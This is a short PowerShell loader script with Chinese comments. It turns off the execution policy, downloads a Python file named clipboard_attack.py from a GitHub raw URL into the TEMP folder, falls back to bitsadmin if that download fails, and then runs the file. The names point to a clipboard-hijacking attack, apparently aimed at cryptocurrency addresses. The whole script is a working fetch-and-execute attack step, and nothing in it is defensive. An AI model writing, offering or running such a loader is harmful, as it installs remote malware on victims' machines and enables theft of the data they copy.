# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 定义脚本下载链接
$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
$scriptPath = "$env:TEMP\clipboard_attack.py"

# 使用 Invoke-WebRequest 下载 Python 脚本
try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
} catch {
    Write-Host "⚠️ Invoke-WebRequest 失败，尝试使用 bitsadmin 下载..."
    bitsadmin /transfer "DownloadScript" $scriptUrl $scriptPath
}

# 确保 Python 脚本已下载
if (Test-Path $scriptPath) {
    Write-Host "✅ 文件下载成功，正在运行..."
    python $scriptPath
} else {
    Write-Host "❌ 下载失败，请检查网络连接或 GitHub 链接是否正确。"
}
